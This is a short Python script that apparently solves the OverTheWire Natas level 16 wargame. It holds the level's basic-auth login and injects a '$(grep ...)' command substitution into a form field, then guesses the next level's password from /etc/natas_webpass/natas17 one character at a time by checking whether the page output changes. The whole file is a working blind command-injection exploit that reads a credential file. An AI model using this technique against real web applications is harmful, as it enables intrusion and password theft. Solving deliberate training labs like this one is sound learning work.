import requests


def solver():
    print("Start Attacking ... ")
    ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    url = "http://natas16.natas.labs.overthewire.org/"
    basic_user="natas16"
    basic_password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
    passwd = ""
    while len(passwd) < 32:
        for c in ch:
            query = f'$(grep -r ^{passwd}{c} /etc/natas_webpass/natas17)'
            response = requests.post(url, data={"needle":query}, auth=(basic_user, basic_password))
            print(f"Checked --> {c}")
            if "African" not in response.text:
                passwd+=c
                print("password --> ",passwd)
                
solver()


